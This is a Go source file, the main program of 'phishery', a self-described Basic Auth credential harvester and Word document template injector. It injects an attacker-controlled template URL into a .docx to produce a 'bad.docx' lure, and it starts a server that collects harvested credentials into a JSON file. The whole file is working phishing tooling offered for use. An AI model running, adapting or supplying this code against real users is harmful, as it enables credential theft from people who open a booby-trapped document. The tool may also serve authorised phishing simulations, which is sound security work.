package main

import (
	"os"
	"os/signal"
	"syscall"
	"flag"
	"fmt"

	"github.com/ryhanson/phishery/badocx"
	"github.com/ryhanson/phishery/phish"
	"github.com/ryhanson/phishery/neatprint"
)

const usage =
`|\   \\\\__   O         __    _      __
| \_/    o \  o  ____  / /_  (_)____/ /_  ___  _______  __
> _   (( <_ oO  / __ \/ __ \/ / ___/ __ \/ _ \/ ___/ / / /
| / \__+___/   / /_/ / / / / (__  ) / / /  __/ /  / /_/ /
|/     |/     / .___/_/ /_/_/____/_/ /_/\___/_/   \__, /
             /_/ Basic Auth Credential Harvester (____/
                 with Word Doc Template Injector

  Start the server  : phishery -s settings.json -c credentials.json
  Inject a template : phishery -u https://secure.site.local/docs -i good.docx -o bad.docx

  Options:
    -h, --help      Show usage and exit.
    -v              Show version and exit.
    -s              The JSON settings file used to setup the server. [default: "settings.json"]
    -c              The JSON file to store harvested credentials. [default: "credentials.json"]
    -u              The phishery URL to use as the Word document template.
    -i              The Word .docx file to inject with a template URL.
    -o              The new Word .docx file with the injected template URL.
`

var neat = neatprint.NewNeatPrint()

func main() {
	var (
		flVersion	= flag.Bool("v", false, "")
		flSettings	= flag.String("s", "settings.json", "")
		flCredentials	= flag.String("c", "credentials.json", "")
		flUrl		= flag.String("u", "", "")
		flDocx		= flag.String("i", "", "")
		flBadocx	= flag.String("o", "", "")
	)
	flag.Usage = func() { fmt.Print(usage) }
	flag.Parse()

	if *flVersion {
		neat.Info("phishery version: " + phish.VERSION)
		os.Exit(0)
	}

	if *flDocx != "" || *flUrl != "" || *flBadocx != "" {
		createBadocx(*flUrl, *flDocx, *flBadocx)
	}

	c := make(chan os.Signal, 2)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func(){
		<-c
		fmt.Println()
		neat.Event("Stopping auth server...")
		os.Exit(1)
	}()

	err := phish.StartPhishery(*flSettings, *flCredentials)
	if err != nil {
		neat.Error("Error starting Phishery server: %s", err)
		os.Exit(1)
	}
}

func createBadocx(url string, in string, out string) {
	if url == "" || in == "" || out == "" {
		neat.Error("Word .docx files and URL are required!")
		neat.Info("Usage: phishery -u https://secure.site.local/docs -i good.docx -o bad.docx")
		os.Exit(0)
	}

	neat.Event("Opening Word document: %s", in)
	wordDocx, err := badocx.OpenDocx(in)
	if err != nil {
		neat.Error("Error opening word document: %s", err.Error())
		os.Exit(1)
	}

	neat.Event("Setting Word document template to: %s", url)
	wordDocx.SetTemplate(url)

	neat.Event("Saving injected Word document to: %s", out)
	if err := wordDocx.WriteBadocx(out); err != nil {
		neat.Error("Error injecting Word doc: %s", err)
		os.Exit(1)
	}

	if err := wordDocx.Close(); err != nil {
		neat.Error("Error closing injected Word doc: %s", err)
		os.Exit(1)
	}

	neat.Info("Injected Word document has been saved!")
	os.Exit(0)
}